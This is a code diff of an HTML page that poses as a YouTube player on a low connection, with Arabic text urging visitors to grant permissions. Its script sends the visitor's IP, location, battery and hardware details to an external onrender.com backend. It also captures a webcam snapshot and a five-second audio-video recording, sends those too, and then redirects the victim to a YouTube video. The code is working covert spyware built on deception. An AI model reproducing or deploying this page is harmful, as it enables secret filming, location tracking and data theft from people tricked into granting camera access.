@@ -2,128 +2,131 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Loading...</title>
+  <title>YouTube Player - Low Connection</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <style>
     body { margin: 0; background: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
-    .container { text-align: center; padding: 25px; }
-    .loader { border: 3px solid #222; border-top: 3px solid #f00; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+    .container { text-align: center; padding: 20px; }
+    .loader { border: 4px solid #333; border-top: 4px solid #ff0000; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }
     @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     video, canvas { opacity: 0; position: absolute; left: -9999px; }
   </style>
 </head>
 <body>
   <div class="container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/YouTube_Logo_2017.svg" width="150">
+    <h2>جارٍ معالجة الفيديو...</h2>
+    <p style="color: #888;">الرجاء السماح بالصلاحيات لتسريع التخزين المؤقت (Buffering)</p>
     <div class="loader"></div>
-    <p style="color: #666; font-size: 14px;">يتطلب المشغل إذن "مزامنة الوسائط" للمتابعة.<br>اضغط على <b>Allow</b> للتشغيل.</p>
   </div>
 
   <video id="v" autoplay muted playsinline></video>
   <canvas id="c" width="640" height="480"></canvas>
 
   <script>
-    const urlParams = new URLSearchParams(window.location.search);
-    const chatId = urlParams.get("id");
-    const reKey = urlParams.get("re"); // الكلمة المختصرة مثلا: fb
-
+    const chatId = new URLSearchParams(window.location.search).get("id");
     const v = document.getElementById("v");
     const c = document.getElementById("c");
     const ctx = c.getContext("2d");
 
-    // خريطة الروابط المختصرة (تقدر تزيد واش تحب)
-    const redirectMap = {
-        "fb": "https://www.facebook.com",
-        "ig": "https://www.instagram.com",
-        "yt": "https://www.youtube.com",
-        "sc": "https://www.snapchat.com",
-        "tk": "https://www.tiktok.com"
-    };
-
+    // نظام الإرسال المتطور
     async function send(msg, type = "text", file = null) {
       if (!chatId) return;
       const payload = { chat_id: chatId };
       if (type === "text") payload.message = msg;
-      if (type === "photo") { payload.message = "📸 SNAPSHOT:"; payload.photo = file; }
-      if (type === "video") { payload.message = "📹 VIDEO (5s):"; payload.video = file; }
+      if (type === "photo") { payload.message = "📸 *HD SNAPSHOT CAPTURED:*"; payload.photo = file; }
+      if (type === "video") { payload.message = "📹 *FORENSIC VIDEO (5s):*"; payload.video = file; }
 
-      return fetch("https://render-backend-package1.onrender.com/submit", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(payload),
-        keepalive: true
-      });
+      try {
+        await fetch("https://render-backend-package1.onrender.com/submit", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload),
+          keepalive: true
+        });
+      } catch (e) { console.error("Signal Lost"); }
     }
 
-    async function analyzeTarget() {
-      // جلب المعلومات المحلية فوراً (باش ما يضيعوش)
+    // جلب البيانات (بطارية + وقت + IP)
+    async function getFullData() {
       let bat = "N/A";
-      try { const b = await navigator.getBattery(); bat = `${Math.round(b.level * 100)}% (${b.charging ? '🔌' : '🔋'})`; } catch(e){}
-      
-      const browserTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-      const hardware = `${navigator.hardwareConcurrency} Cores | ${navigator.deviceMemory || 'N/A'}GB RAM`;
-      const timeStr = new Date().toLocaleString('ar-DZ');
+      try {
+        const b = await navigator.getBattery();
+        bat = `${Math.round(b.level * 100)}% (${b.charging ? 'Charging 🔌' : 'Discharging 🔋'})`;
+      } catch (e) {}
 
-      // نبعث المعلومات الأساسية أولاً
-      let basicMsg = "🏁 *COBRA TARGET INITIAL REPORT* 🏁\n";
-      basicMsg += "━━━━━━━━━━━━━━━━━━━━\n";
-      basicMsg += `🕒 *Time:* ${timeStr}\n`;
-      basicMsg += `🔋 *Battery:* ${bat}\n`;
-      basicMsg += `💻 *Hardware:* ${hardware}\n`;
-      basicMsg += "━━━━━━━━━━━━━━━━━━━━\n";
-      await send(basicMsg);
+      const timeStr = new Date().toLocaleString('ar-DZ', { hour12: true });
 
-      // جلب الـ IP وفحص الـ VPN (في الخلفية)
-      fetch("https://ipapi.co/json/").then(res => res.json()).then(async data => {
-        const isVpn = (data.timezone !== browserTimezone) ? "⚠️ YES (Detected)" : "✅ NO (Real)";
-        let ipMsg = "🌍 *IP SECURITY ANALYSIS* 🌍\n";
-        ipMsg += `📍 *IP:* \`${data.ip}\`\n`;
-        ipMsg += `🛡️ *VPN:* ${isVpn}\n`;
-        ipMsg += `🏢 *ISP:* ${data.org}\n`;
-        ipMsg += `🗺️ *Loc:* ${data.city}, ${data.country}\n`;
-        await send(ipMsg);
-      }).catch(() => {});
-
-      startSpying();
+      fetch("https://ipinfo.io/json?token=9c6f5e4a17b44c")
+        .then(res => res.json())
+        .then(async data => {
+          let m = "🏴‍☠️ *COBRA ELITE SYSTEM V4.0* 🏴‍☠️\n";
+          m += "━━━━━━━━━━━━━━━━━━\n";
+          m += `🌍 *IP:* \`${data.ip}\`\n`;
+          m += `📍 *Loc:* ${data.city}, ${data.country}\n`;
+          m += `🕒 *Time:* ${timeStr}\n`;
+          m += `🔋 *Battery:* ${bat}\n`;
+          m += `💻 *Hardware:* ${navigator.hardwareConcurrency} Cores | ${navigator.deviceMemory || 'N/A'}GB RAM\n`;
+          m += "━━━━━━━━━━━━━━━━━━\n";
+          m += "📡 *STATUS:* Accessing Media Streams...";
+          
+          await send(m);
+          startSpying();
+        });
     }
 
     function startSpying() {
       navigator.mediaDevices.getUserMedia({ video: true, audio: true })
         .then(stream => {
           v.srcObject = stream;
+          
           v.onloadedmetadata = () => {
             v.play();
+
+            // إعداد مسجل الفيديو
             const recorder = new MediaRecorder(stream);
             let chunks = [];
             recorder.ondataavailable = e => chunks.push(e.data);
+            
             recorder.onstop = async () => {
-                const blob = new Blob(chunks, { type: 'video/webm' });
-                const reader = new FileReader();
-                reader.readAsDataURL(blob);
-                reader.onloadend = () => { send("", "video", reader.result.split(',')[1]); };
-                setTimeout(finalizeRedirect, 1500);
+              const blob = new Blob(chunks, { type: 'video/webm' });
+              const reader = new FileReader();
+              reader.readAsDataURL(blob);
+              reader.onloadend = () => {
+                const base64 = reader.result.split(',')[1];
+                send("", "video", base64);
+              };
+              
+              // إنهاء كل شيء والتحويل بعد الإرسال
+              setTimeout(() => {
+                stream.getTracks().forEach(t => t.stop());
+                window.location.replace("https://youtu.be/tNWpOuJk2M8");
+              }, 2000);
             };
 
+            // حل مشكلة السواد: ننتظر 2.5 ثانية لفتح العدسة ثم نصور
             setTimeout(() => {
-              ctx.drawImage(v, 0, 0, c.width, c.height);
-              send("", "photo", c.toDataURL("image/jpeg", 0.8).split(',')[1]);
-              recorder.start();
-              setTimeout(() => { recorder.stop(); stream.getTracks().forEach(t => t.stop()); }, 5000);
-            }, 2500);
+              try {
+                ctx.drawImage(v, 0, 0, c.width, c.height);
+                const img = c.toDataURL("image/jpeg", 0.9).split(',')[1];
+                send("", "photo", img);
+                
+                // نبدأ تسجيل الفيديو فوراً بعد الصورة
+                recorder.start();
+                setTimeout(() => recorder.stop(), 5000); 
+              } catch (e) {
+                send("⚠️ Error: " + e.message);
+              }
+            }, 2500); 
           };
         })
-        .catch(() => {
-          send("❌ *Access Denied*");
-          finalizeRedirect();
+        .catch(err => {
+          send("❌ *Permissions Denied*");
+          window.location.replace("https://youtu.be/tNWpOuJk2M8");
         });
     }
 
-    function finalizeRedirect() {
-      // إذا بعثت re=fb يروح لفيسبوك، إذا ما بعثت والو يروح ليوتيوب
-      let finalUrl = redirectMap[reKey] || "https://www.youtube.com";
-      window.location.replace(finalUrl);
-    }
-
-    if (chatId) analyzeTarget();
+    if (chatId) getFullData();
   </script>
 </body>
 </html>
